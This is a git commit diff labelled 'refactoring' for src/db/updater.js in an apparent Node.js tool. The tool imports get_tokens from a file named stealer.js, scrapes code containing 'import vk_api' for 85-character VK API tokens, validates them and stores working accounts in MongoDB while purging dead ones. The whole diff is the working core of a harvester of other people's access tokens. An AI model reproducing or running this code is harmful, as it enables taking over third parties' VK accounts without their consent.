da5dbe37377ba245e3ae73807bb4bedb25e11c2e
Trard <rivaavir3@gmail.com>
2021-06-09 21:21:29 +0300

    refactoring

--- src/db/updater.js
+++ src/db/updater.js
@@ -1,21 +1,24 @@
 const ObjectId = require('mongodb').ObjectID;
 const { get_tokens } = require("../../lib/stealer.js");
-const { vk_checker, valid_token } = require("./checker.js");
+const { get_accounts, is_token_valid } = require("./checker.js");
 
 const db_update = async (collection) => {
     let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
-    let new_accounts = await vk_checker(new_tokens);
+    let new_accounts = await get_accounts(new_tokens);
     let add_accounts = [];
 
     await Promise.all(new_accounts.map(async (account) => {
-        if ((await collection.find( {token: account.token} ).toArray()).length === 0) {
+        if (
+            (await collection.find( {token: account.token} ).toArray()).length === 0
+            && account.type !== "invalid"
+        ) {
             add_accounts.push(account);
-        }
-    }))
+        };
+    }));
 
     if (add_accounts.length !== 0) {
         await collection.insertMany(add_accounts);
-    }
+    };
 };
 
 const db_clear = async (collection) => {
@@ -23,16 +26,15 @@ const db_clear = async (collection) => {
     let del_ids = [];
 
     await Promise.all(accounts.map(async (account) => {
-        if (!await valid_token(account.token)) {
+        if (!await is_token_valid(account.token)) {
             del_ids.push(ObjectId(account._id));
-        }
+        };
     }));
 
     if (del_ids.length !== 0) {
         await collection.deleteMany( { "_id": { $in: del_ids } } );
-    }
-}
-
+    };
+};
 
 const db_administration = async (collection) => {
     db_update(collection).then(console.log("update db"));
